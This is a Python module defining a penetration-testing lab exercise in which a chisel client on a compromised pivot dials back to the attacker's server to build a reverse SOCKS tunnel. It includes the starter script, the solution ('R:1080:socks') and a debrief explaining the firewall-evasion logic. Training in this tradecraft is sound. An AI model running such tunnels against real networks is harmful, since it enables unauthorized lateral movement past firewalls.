"""conduit topology 7: the same reach with a purpose-built agent.

`ssh -D` is the answer when you have SSH on the pivot. Often you do not: the
foothold is a web shell or a single command, there is no SSH server to lean on,
and the modern answer is a small static agent you drop on the pivot that dials
back to a listener on your box and hands you a proxy. `chisel` and `ligolo-ng`
are the two everybody carries.

**This scenario is gated on `chisel` being installed** (`needs`), and skips
cleanly with an install pointer when it is not, the same way hone gates a
module whose tool is absent. It is authored so that when the binary is present
it verifies for real, and when it is not the reasoning still gets read in the
brief and the debrief.
"""

from __future__ import annotations

from ...model import ConduitBody, Scenario
from ...targets.netns import ATTACKER, Link, Probe, Service, Topology

PLAYBOOK = 'PEN-200 Playbook'

_TOPOLOGY = Topology(
    hosts=(ATTACKER, 'pivot', 'target'),
    links=(Link(ATTACKER, 'pivot', '10.9.0'), Link('pivot', 'target', '10.9.1')),
    services=(Service('target', '10.9.1.2', 8080, 'AGENT-REACHED-FLAG'),),
    negative=(Probe(ATTACKER, '10.9.1.2', 8080, 'AGENT', 'the target directly'),),
    probes=(Probe(ATTACKER, '10.9.1.2', 8080, 'AGENT-REACHED-FLAG',
                  'the target through the chisel proxy',
                  socks=('127.0.0.1', 1080)),),
)

# No sshd on the pivot at all: the whole point is that you did not have one.
# chisel server runs on the attacker box, chisel client on the pivot dials
# back and asks for a reverse SOCKS proxy.
STARTER = r'''#!/bin/sh
# You are on the attacker box (10.9.0.1).
#
#   attacker 10.9.0.1  <-->  10.9.0.2 pivot 10.9.1.1  <-->  10.9.1.2 target
#
# There is NO ssh server on the pivot. You do have a shell on it, and chisel
# is on both boxes. Stand up a chisel server here and a reverse SOCKS tunnel
# from the pivot, so a SOCKS proxy on 127.0.0.1:1080 here reaches the target.
#
# chisel is expected at $(command -v chisel).

# server on the attacker box, accepting a reverse tunnel:
chisel server --port 8888 --reverse >/tmp/chisel-srv.log 2>&1 &
sleep 1

# on the pivot: dial back and ask for a forward SOCKS proxy (wrong: that binds
# the proxy on the pivot, where you are not).
crux_run_on_pivot \
  "chisel client 10.9.0.1:8888 socks >/tmp/chisel-cli.log 2>&1 &"
sleep 2
'''

# The fix is R:socks: a reverse proxy that binds on the SERVER (attacker) side.
SOLUTION = STARTER.replace(
    '"chisel client 10.9.0.1:8888 socks >/tmp/chisel-cli.log 2>&1 &"',
    '"chisel client 10.9.0.1:8888 R:1080:socks >/tmp/chisel-cli.log 2>&1 &"')

SCENARIOS = [
    Scenario(
        id='conduit-agent', track='conduit', tier='verified', order=70,
        title='No SSH on the pivot, so bring your own tunnel',
        waypoint='pivot-chisel', hone=('ssh',),
        needs=('chisel', 'ip'),
        source=f'{PLAYBOOK}/09 - Phase 7 - Lateral Movement, Pivoting & Shells.md',
        body=ConduitBody(
            brief='There is no SSH server on the pivot. You have a shell on '
                  'it and `chisel` on both boxes. Stand up a reverse SOCKS '
                  'tunnel so a proxy on `127.0.0.1:1080` here reaches the '
                  'target. The script has the client asking for the wrong '
                  'kind of proxy.',
            filename='agent.sh',
            starter=STARTER, solution=SOLUTION,
            topology=_TOPOLOGY,
            settle=3.0,
            debrief='**`R:1080:socks` is a reverse proxy: it binds on the '
                    'server side, which is you.** Plain `socks` on the chisel '
                    'client opens the SOCKS listener on the pivot, the one '
                    'machine that did not need a proxy to reach the target. '
                    'The `R:` prefix flips it, exactly like `ssh -R`, so the '
                    'listener appears where the `chisel server` is running. '
                    'The mental model carries straight over from SSH: '
                    '`chisel server --reverse` is your listening post, the '
                    'client dials out from inside (which is why it beats a '
                    'firewall that blocks inbound), and `R:` decides the '
                    'proxy lands on your side. `ligolo-ng` solves the same '
                    'problem with a tun interface instead of a SOCKS proxy, '
                    'so you route to the target subnet as if it were local; '
                    'the reversal reasoning is identical.',
        ),
    ),
]
